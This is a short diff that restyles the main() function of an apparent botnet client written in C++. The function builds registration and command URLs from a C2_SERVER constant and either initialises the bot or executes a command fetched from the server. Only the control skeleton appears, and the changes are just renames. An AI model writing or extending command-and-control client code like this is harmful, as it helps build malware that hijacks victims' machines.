@@ -5,18 +5,18 @@
 #include "bot.hh"
 
 int main() {
-    std::string registerUrl, cmdUrl, seedPath;
+    std::string register_url, command_url, seed_path;
 
-    registerUrl = C2_SERVER + REGISTER_URI;
-    cmdUrl = C2_SERVER + CMD_URI;
-    seedPath = util::getInstallDir() + SEED_FILE;
+    register_url = C2_SERVER + REGISTER_URI;
+    seed_path = util::GetInstallDir() + SEED_FILE;
+    command_url = C2_SERVER + CMD_URI;
 
-    Bot host(seedPath, registerUrl, cmdUrl);
+    Bot host(seed_path, register_url, command_url);
 
-    if (host.isInit()) {
-        host.executeCommand();
+    if (host.IsInit()) {
+        host.ExecuteCommand();
     } else {
-        host.init();
+        host.Init();
     }
 
     return 0;
